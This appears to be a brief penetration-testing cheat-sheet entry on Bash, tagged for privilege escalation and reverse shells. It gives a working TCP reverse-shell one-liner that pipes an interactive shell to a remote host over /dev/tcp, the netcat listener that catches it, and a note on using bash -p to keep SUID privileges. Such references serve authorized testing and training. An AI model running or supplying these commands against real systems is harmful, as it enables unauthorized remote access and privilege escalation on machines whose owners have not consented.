---
title: Bash
desc: Executes shell commands and scripts. It also used to Reverse Shell, etc.
tags: [Linux, PrivEsc, ReverseShell, SUID]
alts: []
website:
---

## Reverse Shell TCP

```sh
# TCP (ex. port: 4444)
bash -i >&  /dev/tcp/10.0.0.1/4444 0>&1

-------------------------------------------

# Listen
nc -lvnp 4444
```

<br />

## Create Bash script

```sh
#!/bin/bash -p (-p: privilege mode. It's used for SUID)

echo 'Hello World'
```